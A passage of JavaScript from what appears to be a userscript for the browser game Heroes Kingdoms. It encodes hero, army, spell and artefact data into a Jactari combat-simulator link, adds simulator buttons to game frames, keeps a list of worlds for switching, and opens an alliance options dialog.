	triplets[4] |= (donnees.a.artefacts[6] & 2047) << 13;
	triplets[4] |= (donnees.a.commandant_infanterie & 3) << 11;
	triplets[4] |= (donnees.a.artefacts[7] & 2047);
	triplets[5] |= (donnees.a.logisticien & 3) << 22;
	triplets[5] |= (donnees.a.harangueur & 3) << 20;
	triplets[5] |= (donnees.a.sapeur & 3) << 18;
	triplets[5] |= (donnees.a.massacreur & 3) << 16;
	triplets[5] |= (donnees.a.instinct[0] & 3) << 14;
	triplets[5] |= (donnees.a.expert[0] & 3) << 12;
	triplets[5] |= (donnees.a.instinct[1] & 3) << 10;
	triplets[5] |= (donnees.a.expert[1] & 3) << 8;
	triplets[5] |= (donnees.a.instinct[2] & 3) << 6;
	triplets[5] |= (donnees.a.expert[2] & 3) << 4;
	triplets[5] |= (donnees.a.instinct[3] & 3) << 2;
	triplets[5] |= (donnees.a.expert[3] & 3);
	triplets[6] |= (donnees.a.bonus_ecole[0] & 15) << 20;
	triplets[6] |= (donnees.a.bonus_ecole[1] & 15) << 16;
	triplets[6] |= (donnees.a.bonus_ecole[2] & 15) << 12;
	triplets[6] |= (donnees.a.bonus_ecole[3] & 15) << 8;
	triplets[6] |= (donnees.a.larmes & 31) << 3;
	triplets[6] |= (donnees.a.faction & 7);
	triplets[7] |= (donnees.a.mhr.signe & 1) << 23;
	triplets[7] |= (donnees.a.mhr.valeur & 131071) << 6;
	triplets[7] |= (donnees.a.archetype & 15) << 2;
	triplets[7] |= (donnees.a.arcanes & 3);
	triplets[8] |= (donnees.d.mhr.signe & 1) << 23;
	triplets[8] |= (donnees.d.mhr.valeur & 131071) << 6;
	triplets[8] |= (donnees.d.larmes & 31) << 1;
	triplets[9] |= (donnees.d.statut & 1) << 23;
	triplets[9] |= (donnees.d.heros & 1) << 22;
	triplets[9] |= (donnees.d.fortification & 3) << 20;
	triplets[9] |= (donnees.d.dolmens & 15) << 16;
	triplets[9] |= (donnees.d.forts & 7) << 13;
	triplets[9] |= (donnees.d.fort_principal & 1) << 12;
	triplets[9] |= (donnees.d.ralliement & 3) << 10;
	triplets[9] |= (donnees.d.inspiration & 3) << 8;
	triplets[9] |= (donnees.d.archetype & 15) << 4;
	triplets[9] |= (donnees.d.faction & 7) << 1;
	triplets[10] |= (donnees.d.bonus_ecole[0] & 15) << 20;
	triplets[10] |= (donnees.d.bonus_ecole[1] & 15) << 16;
	triplets[10] |= (donnees.d.bonus_ecole[2] & 15) << 12;
	triplets[10] |= (donnees.d.bonus_ecole[3] & 15) << 8;
	triplets[10] |= (donnees.d.arcanes & 3) << 6;
	triplets[10] |= (donnees.d.niveau & 63);
	triplets[11] |= (donnees.d.artefacts[0] & 2047) << 13;
	triplets[11] |= (donnees.d.tacticien_defenseur & 3) << 11;
	triplets[11] |= (donnees.d.artefacts[1] & 2047);
	triplets[12] |= (donnees.d.artefacts[2] & 2047) << 13;
	triplets[12] |= (donnees.d.ecuyer_defenseur & 3) << 11;
	triplets[12] |= (donnees.d.artefacts[3] & 2047);
	triplets[13] |= (donnees.d.artefacts[4] & 2047) << 13;
	triplets[13] |= (donnees.d.expert_tirs_barrage & 3) << 11;
	triplets[13] |= (donnees.d.artefacts[5] & 2047);
	triplets[14] |= (donnees.d.artefacts[6] & 2047) << 13;
	triplets[14] |= (donnees.d.inebranlable & 3) << 11;
	triplets[14] |= (donnees.d.artefacts[7] & 2047);
	triplets[15] |= (donnees.d.logisticien & 3) << 22;
	triplets[15] |= (donnees.d.bon_payeur & 3) << 20;
	triplets[15] |= (donnees.d.batisseur_fortifications & 3) << 18;
	triplets[15] |= (donnees.d.massacreur & 3) << 16;
	triplets[15] |= (donnees.d.instinct[0] & 3) << 14;
	triplets[15] |= (donnees.d.expert[0] & 3) << 12;
	triplets[15] |= (donnees.d.instinct[1] & 3) << 10;
	triplets[15] |= (donnees.d.expert[1] & 3) << 8;
	triplets[15] |= (donnees.d.instinct[2] & 3) << 6;
	triplets[15] |= (donnees.d.expert[2] & 3) << 4;
	triplets[15] |= (donnees.d.instinct[3] & 3) << 2;
	triplets[15] |= (donnees.d.expert[3] & 3);
	for (var c=0;c<_camps_abr.length;c++) {
		for (var p = 1; p < 8; p++) {
			var u = donnees[_camps_abr[c]].troupes[p].unite;
			if (u == -1) u = 255;
			triplets[15+p+(c*7)] |= (u & 255) << 16;
			triplets[15+p+(c*7)] |= (donnees[_camps_abr[c]].troupes[p].nombre & 65535);
		}
	}
	triplets[30] |= (donnees.a.sort[0].id & 63) << 18;
	triplets[30] |= (donnees.a.sort[0].tour & 15) << 14;
	triplets[30] |= (donnees.a.sort[1].id & 63) << 6;
	triplets[30] |= (donnees.a.sort[1].tour & 15) << 2;
	triplets[30] |= (donnees.saison & 12);
	triplets[31] |= (donnees.d.sort[0].id & 63) << 18;
	triplets[31] |= (donnees.d.sort[0].tour & 15) << 14;
	triplets[31] |= (donnees.d.sort[1].id & 63) << 6;
	triplets[31] |= (donnees.d.sort[1].tour & 15) << 2;
	triplets[31] |= (donnees.saison & 3);
	triplets[32] |= (donnees.a.butin_de_guerre & 15) << 20;
	triplets[32] |= (donnees.a.relever_les_morts & 15) << 16;
	triplets[32] |= (donnees.a.resistance_magique & 15) << 12;
	triplets[32] |= (donnees.a.moral_eleve & 15) << 8;
	triplets[32] |= (donnees.a.resurrection & 15) << 4;
	triplets[32] |= (donnees.a.tir_de_barrage & 15);
	triplets[33] |= (donnees.a.heros_superieur & 15) << 20;
	triplets[33] |= (donnees.a.maitrise_des_sorts & 15) << 16;
	triplets[33] |= (donnees.a.revelation_de_caracteristiques & 15) << 12;
	triplets[33] |= (donnees.d.butin_de_guerre & 15) << 8;
	triplets[33] |= (donnees.d.relever_les_morts & 15) << 4;
	triplets[33] |= (donnees.d.resistance_magique & 15);
	triplets[34] |= (donnees.d.moral_eleve & 15) << 20;
	triplets[34] |= (donnees.d.resurrection & 15) << 16;
	triplets[34] |= (donnees.d.tir_de_barrage & 15) << 12;
	triplets[34] |= (donnees.d.heros_superieur & 15) << 8;
	triplets[34] |= (donnees.d.maitrise_des_sorts & 15) << 4;
	triplets[34] |= (donnees.d.revelation_de_caracteristiques & 15);
	triplets[35] |= (donnees.a.classement_voies & 7) << 21;
	triplets[35] |= (donnees.d.classement_voies & 7) << 18;
	triplets[35] |= (donnees.a.malus_attaque & 63) << 12;
	if (donnees.a.statut == 0) {
		triplets[35] |= (donnees.a.antimagie & 15) << 8;
		triplets[35] |= (donnees.a.baliste & 15) << 4;
		triplets[35] |= (donnees.a.pieges & 15);
	}
	if (donnees.d.statut == 0) {
		triplets[35] |= (donnees.d.antimagie & 15) << 8;
		triplets[35] |= (donnees.d.baliste & 15) << 4;
		triplets[35] |= (donnees.d.pieges & 15);
	}
	var code = '';
	for (var t = 0; t < 36; t++) {
		code += _base64.charAt((triplets[t] >> 18) & 63);
		code += _base64.charAt((triplets[t] >> 12) & 63);
		code += _base64.charAt((triplets[t] >> 6) & 63);
		code += _base64.charAt((triplets[t]) & 63);
	}
	return code;
}
function isHeroAtackuer( frame, isDefence ) {
	var heroAttaqant = true;
	if ( frame && frame.unitStackLevelSelectElement && frame.content && frame.content.unitStackByLevel ) {	
		var selectedLevel = frame.unitStackLevelSelectElement.value;
		if ( selectedLevel >= 0 ) {
			var levelParams = frame.content.unitStackByLevel[selectedLevel];
			if ( levelParams.combatType == "DEFENSE" )
				heroAttaqant = false;
		}
	}
	if ( frame && isDefence == 1 )
		heroAttaqant = false;
	return heroAttaqant;
}
function getJactariButtonLink( frame, isDefence ){
	if ( frame ) {
		if ( isDefence != 1 )
			var n = document.getElementById('permalien_jactari');
		else
			var n = document.getElementById('permalien_jactari_defencer');
	}
	else
		var n = document.getElementById('hommk-gold-alliance-jactari-start');
	
	return n;
}

function permalien(frame,spy_attaquer,spy_defenser,spy_city_defense){
	//console.log(frame);
	var heroAttaqant = isHeroAtackuer( frame, spy_attaquer );
	var jactariButton = getJactariButtonLink( frame, spy_attaquer );
	var donnees = {
		saison:0,
		a:{ statut:1, dolmens:0, cri_de_guerre:0, inspiration:0, heros:0, niveau:1, faction:0, archetype:0, artefacts:[0,0,0,0,0,0,0,0],
			tacticien:0, ecuyer:0, tireur_elite:0, commandant_infanterie:0, logisticien:0, harangueur:0, sapeur:0, massacreur:0,
			instinct:[0,0,0,0], expert:[0,0,0,0], arcanes:0, bonus_ecole:[0,0,0,0], larmes:0, mhr:{signe:0, valeur:0},
			sort:[ {id:-1, tour:1}, {id:-1, tour:2} ],
			troupes:[ {}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0} ],
			butin_de_guerre:0, relever_les_morts:0, resistance_magique:0, moral_eleve:0, resurrection:0, tir_de_barrage:0, heros_superieur:0,
			maitrise_des_sorts:0, revelation_de_caracteristiques:0, classement_voies:0
		},
		d:{
			statut:0, lieu:0, fortification:0, forts:0, fort_principal:0, dolmens:0, ralliement:0, inspiration:0, heros:0, niveau:1,
			faction:0, archetype:0, artefacts:[0,0,0,0,0,0,0,0],
			tacticien_defenseur:0, ecuyer_defenseur:0, expert_tirs_barrage:0, inebranlable:0, logisticien:0, bon_payeur:0, batisseur_fortifications:0, massacreur:0,
			instinct:[0,0,0,0], expert:[0,0,0,0], arcanes:0, bonus_ecole:[0,0,0,0], larmes:0, mhr:{signe:0, valeur:0},
			sort:[ {id:-1, tour:1}, {id:-1, tour:2} ],
			troupes:[ {}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0}, {unite:255,nombre:0} ],
			butin_de_guerre:0, relever_les_morts:0, resistance_magique:0, moral_eleve:0, resurrection:0, tir_de_barrage:0, heros_superieur:0,
			maitrise_des_sorts:0, revelation_de_caracteristiques:0, classement_voies:0
		}
	};
	
	donnees.saison = H.player.content.worldSeasonNumber;	
	if ( !heroAttaqant ){	// For defencer reset atukking hero - resetted if need later
		donnees.a.statut = 0;	
		donnees.d.statut = 1;
	}
	
	if ( heroAttaqant ) {
		var playerHero = donnees.a;
		var versusHero = donnees.d;
	} 
	else {
		var playerHero = donnees.d;
		var versusHero = donnees.a;
	}
	

	if ( bonus.data && bonus.data.graal ) 
		playerHero.larmes = bonus.data.graal;
	if ( bonus.data && bonus.data.cri )
		playerHero.cri_de_guerre = bonus.data.cri;
	if ( bonus.data && bonus.data.def )
		playerHero.ralliement = bonus.data.def;
	if ( frame )		
		playerHero.bonus_ecole = bonus.data.ecoles;
	else {
		if ( spy_attaquer.bonus )
			donnees.a.bonus_ecole = bonus.data.ecoles;
		else
			donnees.d.bonus_ecole = bonus.data.ecoles;
	}
	
	if ( frame )
		var hero = (frame.linkedHero || frame.hero || frame.selectedHero);	
	var heros = frame ? hero.content : (spy_attaquer.hero || spy_attaquer);
	prepare_heros( playerHero, heros );
		
	if ( !frame ) {
		if ( spy_attaquer.bonus ) {
			var talents = spy_attaquer.bonus.skills;
			if ( talents !== undefined ) {
				for (var t = 0; t < talents.length; t++)
				{
					var talent = talents[t];
					prepare_talent(donnees.a, talent);
				}
			}
			var artefacts = spy_attaquer.bonus.artefacts;    
			prepare_artefacts(donnees.a, artefacts);
		}
	}
	else if  ( heros.heroBonuses ){
		var talents = heros.heroBonuses.skills.local;
		if ( talents !== undefined ) {
			for (var t = 0; t < talents.length; t++) {
				var talent = talents[t];
				prepare_talent(playerHero, talent);
			}
		}
		var artefacts = heros.heroBonuses.artefacts.local;    
		prepare_artefacts(playerHero, artefacts);
	}
	else if ( HOMMK.elementPool.obj.HeroFrame && HOMMK.elementPool.obj.HeroFrame.obj[heros.id] ) {
		var h = HOMMK.elementPool.obj.HeroFrame.obj[heros.id].content;
		//console.log('iciiiiiiiiiiiii');
		var talents = h.heroSkillList;
		if (talents !== undefined) 
		{
			for (var t = 0; t < talents.length; t++)
			{
				var talent = talents[t];
				prepare_talent(playerHero, talent);
			}
		}
		var artefacts = h.equipedArtefacts;    
		prepare_artefacts(playerHero, artefacts);
	}
	
    if ( heros.isMainHero ) {
		for ( var c in heredite.competences )
		{
			var competence = heredite.competences[c];
			var c_nom = competence.heredityAbilityEntity.tagName;
			var c_niveau = competence.level;
			playerHero[_competences_hereditaires[c_nom]] = c_niveau;
		}
		var cv = heredite.cv;
		var c = 0;
		if (cv.d == 0 && cv.w > 0 && cv.h > 0) cv.d = 6 - cv.w - cv.h;
		if (cv.d > 0 && cv.w == 0 && cv.h > 0) cv.w = 6 - cv.d - cv.h;
		if (cv.d > 0 && cv.w > 0 && cv.h == 0) cv.h = 6 - cv.w - cv.d;
		if (cv.d > 0 && cv.w == 0 && cv.h == 0 && cv.d != 2) c = ((cv.d == 3)?1:6);
		if (cv.d == 0 && cv.w > 0 && cv.h == 0 && cv.w != 2) c = ((cv.w == 3)?3:5);
		if (cv.d == 0 && cv.w == 0 && cv.h > 0 && cv.h != 2) c = ((cv.h == 3)?6:1);
		if (cv.d > 0 && cv.w > 0 && cv.h > 0) {
			if (cv.d == 3) c = ((cv.w == 2)?1:2);
			if (cv.w == 3) c = ((cv.d == 2)?3:4);
			if (cv.h == 3) c = ((cv.d == 2)?5:6);
		}
		playerHero.classement_voies = c;
    }
	
	if ( frame )
		var sorts = frame.RoundSpellStackList ? frame.RoundSpellStackList.elementList : [];
	else
		var sorts = heros.spellStackList || heros.spellBookSpellStackList || []; 
		
	for (var i = 0; i < sorts.length; i++)
	{
		var sort = sorts[i].content;
		playerHero.sort[i].id = _sorts[sort.spellEntityTagName];
		playerHero.sort[i].tour = sort.roundPosition;
	}
	
	// swap "sorts"(spells)
	if(sorts.length == 2 && sorts[0].content.attachedSpellEntity.magicSchoolLevel < sorts[1].content.attachedSpellEntity.magicSchoolLevel ){
		var tmp = playerHero.sort[0];
		playerHero.sort[0] = playerHero.sort[1];
		playerHero.sort[1] = tmp;
	}
	
	if ( frame )
		var troupes = (frame.attackerUnitStackList || frame.heroUnitStackList || hero.unitStackList).elementList;
	else
		var troupes = heros.attachedUnitStackList0 || heros.attachedUnitStackList || [];
			
	for (var t = 0; t < troupes.length; t++)
	{
		var troupe = troupes[t].content || troupes[t];
		var troupePosition = troupe.stackPosition || troupe.powerPosition;
		playerHero.troupes[troupePosition] = prepare_troupe(troupe);
	}
	
	
		// Fill versus hero
	var troupes = [];
	if ( HOMMK.isPveWorld && frame.mainElementId.substring(0,8) == "HaltFrame".substring(0,8) ) {
		var heroMoveId = frame.haltList.options[frame.haltList.options.selectedIndex].value;
		var worldMoveId = 0;
		
		for ( var i in frame.content.heroMoves ) {
			if ( frame.content.heroMoves[i].id == heroMoveId ) {
				worldMoveId = frame.content.heroMoves[i].masterHeroMoveId;
				break;
			}
		}
	
		var regionListAnswer = 0;
		var masterMoveId = 0;
		if ( worldMoveId ) {
			if ( HOMMK.elementPool.obj.HeroMove.obj[heroMoveId] )
				masterMoveId = HOMMK.elementPool.obj.HeroMove.obj[heroMoveId].content.masterHeroMove;
			else {
				var moveListsAnswer = HOMMK_user.func.doSyncRequest( {"elParamList":[{"elementType":"HeroMove","ownerType":"WorldMap","ownerId": HOMMK.player.content.worldId,"x":Math.floor( frame.content.heroMoves[i].haltX ),"y":Math.floor( frame.content.heroMoves[i].haltY ),"w": 2, "h": 2 },{"elementType":"Region","ownerType":"WorldMap","ownerId":HOMMK.player.content.worldId,"x":Math.floor( frame.content.heroMoves[i].haltX ) - 5,"y":Math.floor( frame.content.heroMoves[i].haltY ) - 5,"w":10,"h":10}]} );
				regionListAnswer = moveListsAnswer.d['WorldMap' + HOMMK.player.content.worldId + 'RegionList'];
				var moveList = moveListsAnswer.d['WorldMap' + HOMMK.player.content.worldId + 'HeroMoveList'];
				for ( var curMove = 0; curMove < moveList.length; curMove++ ) {
					if ( moveList[curMove].masterHeroMoveId == worldMoveId ) {
						masterMoveId = moveList[curMove].masterHeroMove;
						break;
					}
				}
			}
		}
		var creviceRegionId = 0;
		if ( masterMoveId ) {
			var regionsList = HOMMK.elementPool.obj.Region.obj;
			for ( var i in regionsList ) {
				if ( (regionsList[i].content.x == masterMoveId.x1 && regionsList[i].content.y == masterMoveId.y1 ) || (regionsList[i].content.x == masterMoveId.x2 && regionsList[i].content.y == masterMoveId.y2 ) ) {
					if ( regionsList[i].content && regionsList[i].content.rB && regionsList[i].content.rB.rBE && regionsList[i].content.rB.rBE.tN ) {
						if ( regionsList[i].content.rB.rBE.tN.substring(0,12) == "RIFT_PILLAGE".substring(0,12) ) {
							creviceRegionId = regionsList[i].content;
							break;
						}
					}
				}
			}
			if ( !creviceRegionId ) {
				for ( var i in regionListAnswer ) {
					if ( (regionListAnswer[i].x == masterMoveId.x1 && regionListAnswer[i].y == masterMoveId.y1 ) || (regionListAnswer[i].x == masterMoveId.x2 && regionListAnswer[i].y == masterMoveId.y2 ) ) {
						if ( regionListAnswer[i].rB && regionListAnswer[i].rB.rBE && regionListAnswer[i].rB.rBE.tN ) {
							if ( regionListAnswer[i].rB.rBE.tN.substring(0,12) == "RIFT_PILLAGE".substring(0,12) ) {
								creviceRegionId = regionListAnswer[i];
								break;
							}
						}
					}
				}
			}
		}
		
		if ( creviceRegionId ) {
			var creviceInfo = HOMMK_user.func.doSyncRequest( {"elParamList":[{"elementType":"RiftRegionBuildingFrame","elementId":creviceRegionId.id}]} );
			if ( creviceInfo && creviceInfo.d && creviceInfo.d['RiftRegionBuildingFrame'+creviceRegionId.id] && creviceInfo.d['RiftRegionBuildingFrame'+creviceRegionId.id].regionBuildingHeroList ) {
				var creviceHeroList = creviceInfo.d['RiftRegionBuildingFrame'+creviceRegionId.id].regionBuildingHeroList;
				for ( var curHero in creviceHeroList ) {
					if ( creviceHeroList[curHero].id == masterMoveId.heroId ) {
						for ( var t = 0; t < creviceHeroList[curHero].attachedUnitStackList.length; t++ ) {
							var troupe = creviceHeroList[curHero].attachedUnitStackList[t];
							var position = t + 1;
							versusHero.troupes[position] = prepare_troupe(troupe);
						}
						versusHero.faction = _factions["DUNGEON"];
						versusHero.statut = 1;
						versusHero.heros = 1;
						versusHero.niveau = 30;
						versusHero.archetype = _archetypes["MERCENARY"];
						versusHero.malus_attaque = 0;
						
						if ( heroAttaqant )
							donnees.d.lieu = 3;
						break;
					}
				}
			}
		}
	} 
	else if ( frame ) {
		var troupes = (tmp=(frame.defenderUnitStackList || frame.npcUnitStackList))?tmp.elementList:[];
		if ( frame.content && frame.content.zoneBuilding && frame.content.zoneBuilding.attachedUnitStackList )
			troupes = frame.content.zoneBuilding.attachedUnitStackList;
	}
	else {
		var defenderHero = (spy_defenser.hero || spy_defenser);
		var troupes = defenderHero.attachedUnitStackList0 || defenderHero.attachedUnitStackList || [];
	}
		
	var reconnaissances;
	if ( frame )
		reconnaissances = frame.content.scoutingResultList;
	else {		
		donnees.d.statut = 1;
		if (spy_city_defense)
			donnees.d.fortification = _fortifications[spy_city_defense];
		prepare_heros(donnees.d, defenderHero);
		prepare_artefacts(donnees.d, defenderHero.artefactList);
	}
	if ( reconnaissances && reconnaissances.length >= 1 ) {
		var reco = reconnaissances[0].contentJSON;
		donnees.d.statut = 1;
		if ( reco.cityFortificationTagName )
			donnees.d.fortification = _fortifications[reco.cityFortificationTagName];
		if ( reco.heroList && reco.heroList.length >= 1 ) {
			var heros = reco.heroList[0];
			for (var h = 0; h < reco.heroList.length; h++)
			{
				if (reco.heroList[h].defense > heros.defense)
					heros = reco.heroList[h];
			}
			prepare_heros(donnees.d, heros);
			prepare_artefacts(donnees.d, heros.artefactList);
		}
	}
	
	if ( frame && frame.content && frame.content.unitStackList && frame.content.unitStackList[0] ) {
		if ( frame.content.unitStackList[0].heroId ) {
			versusHero.statut = 1;
			versusHero.heros = 1;
			if ( frame.content.unitStackList[0].factionEntityTagName)
				versusHero.faction = _factions[frame.content.unitStackList[0].factionEntityTagName];
		}
	}
	for ( var t = 0; t < troupes.length; t++ )
	{
		var troupe = troupes[t].content || troupes[t];
		var position = troupe.powerPosition || troupe.stackPosition;
		versusHero.troupes[position] = prepare_troupe(troupe);
	}
		
	if ( frame && frame.unitStackLevelSelectElement && frame.content && frame.content.unitStackByLevel ) {
		
		var selectedLevel = frame.unitStackLevelSelectElement.value;
		if ( selectedLevel >= 0 ) {
			var levelParams = frame.content.unitStackByLevel[selectedLevel];
			var defenceName = String( levelParams.defenseName );
			
			versusHero.antimagie = levelParams.spellEfficiencyDecrease / 10;
			versusHero.pieges = levelParams.traps/3;
			if ( versusHero.antimagie == 0 && versusHero.pieges == 0 )
				versusHero.baliste = defenceName.match( /\d+/g );
		}
	}
	
	jactariButton.href = url_combat + '?info=' + encode_donnees_combat(donnees);
	return true;
};

function init() {
	var lang = H.locale.substr(0,2);
	switch (lang) {
		//case 'en': 
		case 'de': url_combat = base_url + 'Kampf'; break;
		case 'ru': url_combat = base_url + '%D0%B1%D0%BE%D0%B9'; break;
		case 'fr': url_combat = base_url + 'combat'; break;
		default: url_combat = base_url + 'fight'; break;
	};
	addStyle('#permalien_jactari:hover{} #permalien_jactari { font-size:smaller; background-color:beige; padding-left: 26px; position: absolute; top: 50px; left: 320px; width: 65px; border: solid black 1px; background-repeat:no-repeat; height: 16px; background-image: url(' + base_url + 'images/icone-combat.png); z-index: 1000; }');
	addStyle('#permalien_jactari_defencer:hover{} #permalien_jactari_defencer { font-size:smaller; background-color:beige; padding-left: 26px; position: absolute; top: 50px; left: 320px; width: 65px; border: solid black 1px; background-repeat:no-repeat; height: 16px; background-image: url(' + base_url + 'images/icone-combat.png); z-index: 1000; }');
	heredite.init();
	bonus.init();
	
	
	
	function ajout_bouton(r) {
		var c,frame = this;
		function createJactariButton(id,def,container,left,top){
			var n = document.getElementById(id);
			if(n) n.parentNode.removeChild(n);
			n = document.createElement('a');
			n.id = id;
			n.href = url_combat;
			n.target = '_blank';
			n.title = def?'simulation as defencer':'simulation';
			n.innerHTML = def?'Defencer':'jactari';
			n.addEventListener('click', function(E) { return permalien(frame,def); }, true);
			if(left) n.style.left=left+'px';
			if(top) n.style.top=top+'px';
			if(container) container.appendChild(n);
			return n;
		}
		switch(frame.mainElementId.substring(0,4)){
			case "Hero":
				c = document.getElementById('HeroFrame'+frame.content.id+'HeroContainer');
				createJactariButton('permalien_jactari',0,c,15,30);
				createJactariButton('permalien_jactari_defencer',1,c,15,55);
				break;
			case "Zone":
				c = frame.contentMainElement;
				createJactariButton('permalien_jactari',undefined,c,280,30);
				break;
			case "Halt":
				c = frame.contentMainElement;
				createJactariButton('permalien_jactari',undefined,c,100,20);
				createJactariButton('permalien_jactari_defencer',1,c,220,20);
				break;
			default: //fight
				c = frame.getChildElement('Defender');	
				createJactariButton('permalien_jactari',undefined,c); 
		}
		return r;
	};
	H.BattlePrepFrame.prototype.show = injectAfter(H.BattlePrepFrame.prototype.show, ajout_bouton);
	H.ZoneBuildingPortalUpgradeFrame.prototype.show = injectAfter(H.ZoneBuildingPortalUpgradeFrame.prototype.show, ajout_bouton);
	H.HeroFrame.prototype.show = injectAfter(H.HeroFrame.prototype.show, ajout_bouton);
	if(H.ZoneBuildingDungeonUpgradeFrame) // saison < 3
		H.ZoneBuildingDungeonUpgradeFrame.prototype.show = injectAfter(H.ZoneBuildingDungeonUpgradeFrame.prototype.show, ajout_bouton);
	if ( HOMMK.isPveWorld )
		H.HaltFrame.prototype.show = injectAfter(H.HaltFrame.prototype.show, ajout_bouton);
	
};



return {init:init,permalien:permalien};

}());

capsule.init();


(function(){
	var worldList = localStorage_getObject('worldList',{});
	worldList["w"+HOMMK.player.content.worldId] = HOMMK.WORLD_NAME;
	localStorage_setObject('worldList',worldList);
	
	var optionsWorld = "";
		
	function setWorld(servedId){	
				if(HOMMK.player.content.worldId == servedId)
					return false;
				var servedName = $(this).find("option:selected").text();
				var ifr = document.createElement('iframe');
				
					ifr.style.position="absolute";
					ifr.style.top="20px";
					ifr.style.left="-50px";
					ifr.style.width="20px";
					ifr.style.height="20px";
				
				ifr.src="http://"+window.top.location.hostname+"/selectWorld?worldId="+servedId;
				document.body.appendChild(ifr);
				
				$dark = $('<div>.</div>');
				$dark.css({
					backgroundColor:'black',
					position:'absolute',
					top:'0',
					lef:'0',
					width:'100%',
					height:'100%',
					zIndex:'10500'
				});
				$dark.hide();
				$dark.appendTo($('body'));
				$dark.fadeIn(5000);
				
				setTimeout(function(){ifr.src="about:blank";window.top.location = "http://"+window.top.location.hostname+"/play";},900);
				
		return false;
	}
		
	var thisWorldButton;
	var subMenu = $('<div class="ui-dialog ui-widget ui-widget-content submenu"></div>')
		.css({position:'relative',left:"-2px",top:"4px"}).hide();
	for(var i in worldList){
		var clasS = "ui-button ui-button-text-only ui-widget ";
		if(i.substring(1,i.length) == HOMMK.player.content.worldId){
			var text = "* "+worldList[i];
			clasS += "ui-state-disabled";
		}
		else{
			var text = "&nbsp; "+worldList[i];
			clasS += "ui-state-default";
		}
			
		var button = $('<a href="#" target="_blank" style="display:block;" class="'+clasS+'">'+text+'</a>').hover(function(){
			if(!$(this).hasClass("ui-state-disabled"))
				$(this).addClass('ui-state-hover');
		},function(){
			$(this).removeClass('ui-state-hover');
		});
		var fn = (function(o){ return function(){ setWorld(o);return false; };})(i.substring(1,i.length));
		button.click(fn);
		button.appendTo(subMenu);
		
		
		if(i.substring(1,i.length) == HOMMK.player.content.worldId)
			thisWorldButton = button;
	}
	
	var resetButton = $('<a href="#" target="_blank" style="display:block;" class="ui-button  ui-widget ui-state-default">| '+localize("EMPTY_LIST")+' |</a>')
		.hover(function(){
			$(this).addClass('ui-state-hover');
		},function(){
			$(this).removeClass('ui-state-hover');
		})
		.click(function(){
			if(!confirm("Are you sure to empty the list ?"))
				return false;
			subMenu.empty();
			var newWorldList = {};
			newWorldList["w"+HOMMK.player.content.worldId] = HOMMK.WORLD_NAME;
			localStorage_setObject('worldList',newWorldList);
			thisWorldButton.click(function(){return false;})
				.appendTo(subMenu);
			resetButton.click(function(){return false;})
				.appendTo(subMenu);
			subMenu.toggle();
			return false;
		})
		.css({
			borderTop:"solid black 2px",
			textAlign:"left",
			paddingLeft:"40px"
		})
		.appendTo(subMenu);
		
	
		
	/*subMenu.append($('<hr>'));		
	subMenu.append($('<hr/>'));	
	var button = $('<a href="#" target="_blank" style="display:block;" class="ui-helper-reset">clear list</a>').hover(function(){
			$(this).addClass('ui-state-hover');
		},function(){
			$(this).removeClass('ui-state-hover');
		});
	button.click(function(){return false;});
	button.appendTo(subMenu);*/
	
	toobar_button("<img src='http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.129-8-MTR/img/favicon.ico' /> "+localize("WORLD_BUTTON"),
		function(){subMenu.toggle();return false;},
		$main_row,
		subMenu
		);
	
	
				
	/*
	
	$('<a href="#" target="_blank" style="margin-top:-6px;display:block;">clear world list</a>')
        .button()
        .appendTo($option_extended)
        .click(function() {	
			localStorage.removeItem('worldList');
			window.top.location = window.top.location;
			return false;
		});
	$('<br/>').appendTo($option_extended);*/
})();
(function(){
	var autosave = localStorage_getObject("HOMMK_ally_autosave",false);
	HOMMK_user.ally = {visible:localStorage_getObject("HOMMK_ally",false),msg:[]};
	var position = localStorage_getObject("HOMMK_ally_position",{left:0,top:20});
	var $dialog_alliance = $('<div id="hommk-gold-alliance"></div>').html(
		$('<div id="tabs">'
		+'	<ul>'
		+'		<li><a href="#tabs-1">'+localize("LINK_OPTION")+'</a></li>'
		+'		<li><a href="#tabs-2">'+localize("ALLIANCE_REPORT")+'</a></li>'
		//+'		<li><a href="#tabs-panels">Panels</a></li>'
		//+'		<li><a href="#tabs-login">Login</a></li>'
		+'	</ul>'
		+'	<div id="tabs-1"></div>'
		+'	<div id="tabs-2"></div>'
		//+'	<div id="tabs-panels">soon</div>'
		//+'	<div id="tabs-login">very soon^^</div>'
		+'</div>')
        )
		.dialog({
			width:670,
			autoOpen: false,
			zIndex: 90000,
			resizable: false,
			title: localize("ALLIANCE_BUTTON"),
			open: function(event, ui){   
				localStorage_setObject("HOMMK_ally", true );
				HOMMK_user.ally.visible=1;
				//$('#tabs').tabs('select', '#tabs-1');
				$('#tabs').tabs({selected:0});
			},
			close: function(event, ui){
				localStorage_setObject("HOMMK_ally", false );
				HOMMK_user.ally.visible=0;
			},
			dragStop: function(e,ui) { 
				localStorage_setObject("HOMMK_ally_position",ui.position);
			},
			position: [position.left,position.top]
		});
			
	$('#tabs-1').html(''
		+'<input type=checkbox id=hommk-gold-autosave-spy /><label for="hommk-gold-autosave-spy"> '+localize("ALLIANCE_AUTOSPY")+'</label><br/>'	
		+'<input type=checkbox id=hommk-gold-autosave-battle disabled=disabled/><label for="hommk-gold-autosave-battle" style="color:gray;" > '+localize("ALLIANCE_AUTOBATT")+'<br/>'
		+'<input type=checkbox id=hommk-gold-hide-panel disabled=disabled/><label for="hommk-gold-autosave-battle" style="color:gray;" > '+localize("ALLIANCE_HIDEPAN")+'<br/>'
	);
	$('#tabs-2').html(''
		+'no saved message..'	
	);
	/*$('#tabs-3').html(''
		+'<br/><div style="text-align:center;"><br/>enter password :<br/>'
		+'<input type=text id="hommk-gold-password" value="" /><br/><br/>'	
		+'<input type=checkbox id="hommk-gold-keep-login" checked=checked /><label form"hommk-gold-keep-login">keep me logged</label><br/><br/>'
		+'<input type=button value="connect" /><br/>'
		+'<br/></div>'
	);*/
    $('#tabs').tabs(); 
	
	HOMMK_user.ally.filter = HOMMK_user.ally.filter || {alliance:0,player:0,x:0,y:0};
	var onchanger = w.onchanger = window.onchanger = function(obj){
		if(obj.name == "coord_filter"){
			var x = parseInt($("#hommk-gold-ally-x").val());
			var y = parseInt($("#hommk-gold-ally-y").val());
			if(x == "x" || x == "")
				x = 0;
